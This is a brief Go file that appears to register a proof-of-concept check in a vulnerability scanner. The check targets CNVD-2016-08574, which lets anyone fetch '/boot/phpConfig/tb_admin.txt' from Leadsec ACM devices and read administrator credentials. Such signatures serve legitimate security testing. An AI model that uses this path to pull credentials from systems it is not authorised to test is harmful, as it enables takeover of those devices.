package poc

func (Info *PocInfo) CNVD_2016_08574_Init() {
	poc := PocInfo{}

	// 设置poc-Info信息
	poc.Info.ID = "CNVD-2016-08574"
	poc.Info.Target = "leadsec"
	poc.Info.Type = "INFO"
	poc.Info.Name = "Leadsec ACM username and password INFO"
	poc.Info.Level = 0
	poc.Info.Author = "youzai"

	// 设置poc-Poc信息
	poc.Poc.Proto = "http"
	poc.Poc.Method = "GET"
	poc.Poc.Path = []string{"/boot/phpConfig/tb_admin.txt"}
	poc.Poc.Param = []string{""}
	poc.Poc.Header = nil
	poc.Poc.Data = nil
	poc.Poc.Word = []string{"admin"}

	// 设置poc-Config信息
	poc.Config.Customize = false

	PocStruct = append(PocStruct, poc)
}
